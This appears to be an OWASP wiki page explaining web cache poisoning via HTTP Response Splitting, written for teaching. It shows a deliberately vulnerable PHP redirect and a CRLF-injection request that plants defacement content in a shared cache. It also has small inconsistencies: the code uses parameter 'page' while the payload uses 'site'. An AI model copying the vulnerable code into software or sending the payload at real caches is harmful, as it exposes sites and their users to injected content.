---

layout: col-sidebar
title: Cache Poisoning
author: Weilin Zhong, Rezos
contributors: Pshanks, KristenS, Ingo86, Achim, kingthorin
permalink: /attacks/Cache_Poisoning
tags: attack, Cache Poisoning

---

{% include writers.html %}

## Description

The impact of a maliciously constructed response can be magnified if it
is cached either by a web cache used by multiple users or even the
browser cache of a single user. If a response is cached in a shared web
cache, such as those commonly found in proxy servers, then all users of
that cache will continue to receive the malicious content until the
cache entry is purged. Similarly, if the response is cached in the
browser of an individual user, then that user will continue to receive
the malicious content until the cache entry is purged, although only the
user of the local browser instance will be affected.

To successfully carry out such an attack, an attacker:

- Finds the vulnerable service code, which allows them to fill the HTTP header field with many headers.
- Forces the cache server to flush its actual cache content, which we want to be cached by the servers.
- Sends a specially crafted request, which will be stored in cache.
- Sends the next request. The previously injected content stored in cache will be the response to this request.

This attack is rather difficult to carry out in a real environment. The
list of conditions is long and hard to accomplish by the attacker.
However it's easier to use this technique than [Cross-User
Defacement](Cross-User_Defacement).

A Cache Poisoning attack is possible because of [HTTP Response
Splitting](HTTP_Response_Splitting) and flaws in the web
application. It is crucial from the attacker's point of view that the
application allows for filling the header field with more than one
header using CR (Carriage Return) and LF (Line Feed) characters.

## Examples

We have found a web page, which gets its service name from the "page"
argument and then redirects (302) to this service.

e.g. `http://testsite.com/redir.php?page=http://other.testsite.com/`

And exemplary code of the redir.php:

```
rezos@dojo ~/public_html $ cat redir.php
<?php
header ("Location: " . $_GET['page']);
?>
```

Crafting appropriate request:

1. Remove page from the cache

```http
GET http://testsite.com/index.html HTTP/1.1
Pragma: no-cache
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
```

HTTP header fields `Pragma: no-cache` and 'Cache-Control: no-cache' should 
remove the page from cache (if the page is stored in cache, obviously).

2. Using HTTP Response Splitting we force cache server to generate two responses to one request

```http
GET http://testsite.com/redir.php?site=%0d%0aContent-
Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-
Modified:%20Mon,%2027%20Oct%202009%2014:50:18%20GMT%0d%0aConte
nt-Length:%2020%0d%0aContent-
Type:%20text/html%0d%0a%0d%0a<html>deface!</html> HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
```

We are intentionally setting the future time (in the header it's set to
27 October 2009) in the second response HTTP header "Last-Modified" to
store the response in the cache.

We may get this effect by setting the following headers:

- Last-Modified (checked byt the If-Modified-Since header)
- ETag (checked by the If-None-Match header)

3. Sending request for the page, which we want to replace in the cache of the server

```http
GET http://testsite.com/index.html HTTP/1.1
Host: testsite.com
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8
```

In theory, the cache server should match the second answer from the
request #2 to the request #3. In this way we've replaced the cache
content.

The rest of the requests should be executed during one connection (if
the cache server doesn't require a more sophisticated method to be
used), possibly immediately one after another.

It may appear problematic to use this attack as a universal technique for
cache poisoning. It's due to cache server's different connection model
and request processing implementations. What does it mean? That for
example effective method to poison Apache 2.x cache with mod_proxy and
mod_cache modules won't work with Squid.

A different problem is the length of the URI, which sometime makes it
impossible to put the necessary response header, which would next be
matched to the request for the poisoned page.

The request examples used are from the Amit Klein paper referenced below, which were modified on the
needs of the article.

More information can be found in this document, which focuses on these
kinds of attacks [by Amit Klein, Director of Security and Research](http://packetstormsecurity.org/papers/general/whitepaper_httpresponse.pdf)
